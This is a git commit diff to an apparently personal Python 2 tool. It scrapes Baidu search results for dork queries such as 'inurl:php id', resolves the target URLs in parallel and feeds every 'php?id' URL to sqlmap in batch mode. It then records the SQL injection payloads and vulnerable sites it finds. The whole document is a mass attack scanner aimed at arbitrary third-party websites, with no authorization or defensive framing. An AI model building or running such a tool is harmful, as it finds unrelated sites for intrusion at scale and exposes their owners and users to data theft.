b71208694c6cea3138e2b7b1dbc41a31fbf5944b
yw0lk1nni9ht <641195340@qq.com>
2017-05-01 00:27:07 +0800

    1
    1

--- console.py
+++ console.py
@@ -3,31 +3,37 @@ import search
 from threadpool import *
 import requests  
 import os
+import time
+import random
 
 oriURL = []
 URL = []
 result = []
-
+resulturl = []
 head = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"}
 def ThreadRun(u):
     try:
         #print u[6:-1]
+        r = requests.get(u[6:-1],timeout=10,headers={'Connection':'close'})
+        print r.url
+        #r.connection.close()
+        #print r.headers 
         #print requests.get(u[6:-1]).url
-        URL.append(requests.get(u[6:-1]).url)
-    except Exception,e:
+        URL.append(r.url)
+    except Exception ,e:
+        print Exception ,":" , e
         pass
 
+
 def ThreadTest(u):
-    print u
+##    print u
+    
     if 'php?id' in u:
         r = os.popen('C:\Users\Administrator\Desktop\sqltest\sqlmapproject-sqlmap-ab08273\sqlmap.py --batch --timeout 3 -u '+ u )
         text = r.read()
         if 'Parameter:' in text:
+            resulturl.append(u)
             result.append(u +'\n' +text[text.find('Payload:'):text.find('---\n[')])
-            #print u
-            #result.append(text[text.find('Payload:'):text.find('---\n[')])
-            #print text[text.find('Payload:'):text.find('---\n[')]
-            #print '\n'
         #f.close()
         r.close()
 
@@ -39,17 +45,16 @@ a = search.BaiduSearchSpider(searchText ,pagenumber)
 oriURL =a.baiduURLs()
 print '收集了'+str(len(oriURL))+'个url'
 print '第一步收集已经完成'
-   
+
+
 #second:find real url
 print '正在获取真实url'.decode('UTF-8').encode('GBK')
-pool = ThreadPool(30)
+pool = ThreadPool(50)
 rrequests = makeRequests(ThreadRun,oriURL)
 [pool.putRequest(req) for req in rrequests]
 pool.wait()
 print '真实url已经获取完毕'.decode('UTF-8').encode('GBK')
-print len(URL)
-for i in URL:
-    print i
+
     
 #thrid:pull to sqlmap to check
 print '正在寻找存在漏洞网站'.decode('UTF-8').encode('GBK') 
@@ -59,6 +64,7 @@ trrequests = makeRequests(ThreadTest,URL)
 pool.wait()
 print '测试完毕,正在写入文件'.decode('UTF-8').encode('GBK') 
 f2 = open('result.txt','w')
+result = list(set(result))
 for i in result:
     f2.write('------------------------------------------')
     f2.write(i)
@@ -66,5 +72,13 @@ for i in result:
     f2.write('\n')
     #f.write('\n')
 f2.close()
+
+resulturl = list(set(resulturl))
+f3 = open('resulturl.txt','w')
+for iii in resulturl:
+    f3.write(iii)
+    f3.write('\n')
+f3.close()
+
 print '写入完毕'.decode('UTF-8').encode('GBK') 
 
--- search.py
+++ search.py
@@ -2,6 +2,7 @@
 import requests
 from pyquery import PyQuery as Pq
 import re
+from threadpool import *
 
 class BaiduSearchSpider(object):
     def __init__(self,searchText,number):
@@ -9,15 +10,31 @@ class BaiduSearchSpider(object):
         self.headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"}
         self._page = None
         self.pagenumber = number
-    def page(self,url):
+    def page(self,urll):
+        '''
+        r = requests.get(urll, headers=self.headers)
+        r.encoding = 'utf-8'
+        page = Pq(r.text)
+        pa = pa + re.findall('href="http://www.baidu.com/link\S*"',page)
+        '''
         if not self._page:
-            r = requests.get(url, headers=self.headers)
+            r = requests.get(urll, headers=self.headers)
             r.encoding = 'utf-8'
-            self._page = Pq(r.text)
-        return self._page
+            page = Pq(r.text)
+        return page
     
     def baiduURLs(self):
         li = []
+        '''
+        urls = []
+        for i in range(int(self.pagenumber)):
+            urls.append(self.url + '&pn=' + str(i*10))
+        print urls
+        pool = ThreadPool(10)
+        rrequests = makeRequests(self.page,zip(urls,li))
+        [pool.putRequest(req) for req in rrequests]
+        pool.wait()
+        '''
         for i in range(int(self.pagenumber)):
             temp = []
             url = self.url + '&pn=' + str(i*10)
@@ -27,7 +44,7 @@ class BaiduSearchSpider(object):
 
             temp = list(set(temp))
             li = li + temp
-            print '第%s页所有url已经收集完毕' % i
+            print '第%s页所有url已经收集完毕' % i    
         return li 
 
     def write_to_file(self,alist):
@@ -37,8 +54,9 @@ class BaiduSearchSpider(object):
             f.write('\n')
         f.close()
 
-##a = BaiduSearchSpider('inurl:php id',1)
+##a = BaiduSearchSpider('inurl:php id',20)
 ##lis = a.baiduURLs()
 ##for i in lis:
 ##    print i
+##print len(lis)
 
